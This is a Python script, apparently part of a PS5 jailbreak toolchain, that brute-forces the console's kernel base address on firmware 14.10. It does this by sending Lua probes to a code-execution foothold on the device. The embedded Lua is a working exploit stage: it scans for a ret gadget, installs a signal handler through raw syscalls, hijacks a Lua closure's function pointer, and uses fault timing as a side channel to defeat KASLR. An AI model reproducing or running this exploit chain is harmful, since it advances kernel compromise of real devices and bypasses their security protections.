#!/usr/bin/env python3
"""
KASLR brute-force driver for PS5 14.10.

Sends a Lua probe per TCP connection, each testing ONE kernel base candidate.
If the probe succeeds (oracle detects valid kernel), it prints the result.
If the probe crashes (wrong guess), reconnects with the next candidate.

13.60 observed kernel bases:
  0xffffffff8a9c0000 (offset 0x0A9C0000 from KERNBASE)
  0xffffffff9e3f0000 (offset 0x1E3F0000 from KERNBASE)
Both 64KB aligned, KERNBASE = 0xffffffff80000000

Usage:
  python3 tools/kaslr_bruteforce.py --ps5-ip <IP> [--start-offset 0x0] [--step 0x200000]
"""

import argparse
import socket
import struct
import sys
import time

KERNBASE = 0xFFFFFFFF80000000
DEFAULT_STEP = 0x200000      # 2MB
DEFAULT_RANGE = 0x80000000   # 2GB
PS5_PORT = 9026
RECV_TIMEOUT = 15

# Lua probe template — tests ONE candidate kernel base
# Uses the oracle determined by probe 56k results
PROBE_TEMPLATE = r'''
print("=== KASLR CANDIDATE TEST ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {{}}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

-- Candidate: {candidate_hex}
local CAND = "{candidate_hex}"

-- Oracle: install signal handler, redirect CClosure to candidate, time fault
local sc_sigaction = make_syscall(416)
local sc_info = make_syscall(593)
local sc_clock = make_syscall(232)

-- Get eboot text for gadget
local info_buf = memory.alloc(0x200)
safe_wd(info_buf, 0x160)
pcall(function() sc_info(uint64(0), info_buf) end)
local eb_lo = safe_rd(info_buf + 0x108) or 0
local eb_hi = safe_rd(info_buf + 0x10C) or 0
local eb_sz = safe_rd(info_buf + 0x110) or 0
local eb_base = uint64(string.format("0x%X%08X", eb_hi, eb_lo))

-- Find ret gadget
local gadget = nil
for off = 0, math.min(eb_sz - 1, 0x10000), 1 do
    local b = safe_rd(eb_base + off)
    if b and (b % 256) == 0xC3 then
        gadget = eb_base + off
        break
    end
end

if not gadget then
    print("NO_GADGET")
    return
end

-- Install SIGSEGV handler
local sa = memory.alloc(0x40)
safe_wq(sa, gadget)
safe_wd(sa + 8, 0x42)
safe_wq(sa + 0x10, uint64(0))
local sa_ok, sa_ret = pcall(function() return sc_sigaction(uint64(11), uint64(sa), uint64(0)) end)
if not sa_ok or to_num(sa_ret) ~= 0 then
    print("NO_SIGACTION")
    return
end

-- Get rawequal CClosure
local re_str = tostring(rawequal)
local re_hex = re_str:match("(0x[0-9a-fA-F]+)")
local cc_addr = nil
if re_hex then
    cc_addr = uint64(re_hex)
else
    local re_dec = re_str:match(": (%d+)")
    if re_dec then
        cc_addr = uint64(string.format("0x%X", tonumber(re_dec)))
    end
end
if not cc_addr then
    print("NO_CCLOSURE")
    return
end

local orig_fn = safe_rq(cc_addr + 0x20)

-- Timer
local ts_buf = memory.alloc(16)
local function get_ns()
    safe_wq(ts_buf, uint64(0))
    safe_wq(ts_buf + 8, uint64(0))
    pcall(function() sc_clock(uint64(4), uint64(ts_buf)) end)
    local sec = safe_rd(ts_buf) or 0
    local nsec = safe_rd(ts_buf + 8) or 0
    return sec * 1000000000 + nsec
end

-- Test: redirect to candidate, measure fault time
-- Compare with unmapped reference
local ITERS = 50
local sum_cand = 0
local survived = true

for i = 1, ITERS do
    local ta = get_ns()
    safe_wq(cc_addr + 0x20, uint64(CAND))
    local ok = pcall(function() return rawequal(1, 2) end)
    safe_wq(cc_addr + 0x20, orig_fn)
    local tb = get_ns()
    if not ok and tb == 0 then
        survived = false
        break
    end
    sum_cand = sum_cand + (tb - ta)
end

if not survived then
    print("CRASHED")
    return
end

-- Reference: unmapped VA
local sum_ref = 0
for i = 1, ITERS do
    local ta = get_ns()
    safe_wq(cc_addr + 0x20, uint64("0xFFFFFFFFF0000000"))
    pcall(function() return rawequal(1, 2) end)
    safe_wq(cc_addr + 0x20, orig_fn)
    local tb = get_ns()
    sum_ref = sum_ref + (tb - ta)
end

local avg_cand = sum_cand / ITERS
local avg_ref = sum_ref / ITERS
local diff = avg_cand - avg_ref

print(string.format("RESULT cand=%s avg_cand=%d avg_ref=%d diff=%d", CAND, avg_cand, avg_ref, diff))
if math.abs(diff) > avg_ref * 0.1 then
    print("ORACLE_HIT " .. CAND)
end
print("ALIVE")
'''


def send_probe(ip, port, lua_code, timeout=RECV_TIMEOUT):
    """Send Lua probe, return output or None on connection failure."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))

        data = lua_code.encode('utf-8')
        header = struct.pack('<Q', len(data))
        sock.sendall(header + data)

        output = b''
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                output += chunk
            except socket.timeout:
                break

        sock.close()
        return output.decode('utf-8', errors='replace')
    except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError, OSError) as e:
        return None


def main():
    parser = argparse.ArgumentParser(description='PS5 14.10 KASLR brute-force')
    parser.add_argument('--ps5-ip', required=True, help='PS5 IP address')
    parser.add_argument('--start-offset', default='0x0', help='Start offset from KERNBASE (hex)')
    parser.add_argument('--step', default=hex(DEFAULT_STEP), help='Step size (hex)')
    parser.add_argument('--range', default=hex(DEFAULT_RANGE), help='Total range to scan (hex)')
    parser.add_argument('--delay', type=float, default=0.5, help='Delay between connections (seconds)')
    args = parser.parse_args()

    start_off = int(args.start_offset, 16)
    step = int(args.step, 16)
    scan_range = int(args.range, 16)
    total = scan_range // step

    print(f"KASLR brute-force: {total} candidates")
    print(f"  KERNBASE: 0x{KERNBASE:016X}")
    print(f"  Range: +0x{start_off:X} to +0x{start_off + scan_range:X}")
    print(f"  Step: 0x{step:X}")
    print(f"  Target: {args.ps5_ip}:{PS5_PORT}")
    print()

    hits = []
    crashes = 0
    alive = 0

    for i in range(total):
        offset = start_off + i * step
        candidate = KERNBASE + offset
        candidate_hex = f"0x{candidate:016X}"

        probe = PROBE_TEMPLATE.replace("{candidate_hex}", candidate_hex)

        sys.stdout.write(f"\r[{i+1}/{total}] Testing {candidate_hex}...")
        sys.stdout.flush()

        result = send_probe(args.ps5_ip, PS5_PORT, probe)

        if result is None:
            crashes += 1
            sys.stdout.write(" CONNECT_FAIL\n")
            time.sleep(args.delay * 2)
            continue

        if "ORACLE_HIT" in result:
            hits.append((candidate_hex, result))
            sys.stdout.write(f" *** HIT ***\n")
            print(result)
        elif "CRASHED" in result:
            crashes += 1
            sys.stdout.write(" crashed\n")
        elif "ALIVE" in result:
            alive += 1
            # Extract timing data
            for line in result.split('\n'):
                if line.startswith("RESULT"):
                    sys.stdout.write(f" {line}\n")
                    break
            else:
                sys.stdout.write(" alive\n")
        else:
            sys.stdout.write(f" unknown: {result[:80]}\n")

        time.sleep(args.delay)

    print(f"\n\nScan complete: {alive} alive, {crashes} crashes, {len(hits)} hits")
    if hits:
        print("\nHITS:")
        for h, r in hits:
            print(f"  {h}")
            print(f"    {r[:200]}")


if __name__ == '__main__':
    main()
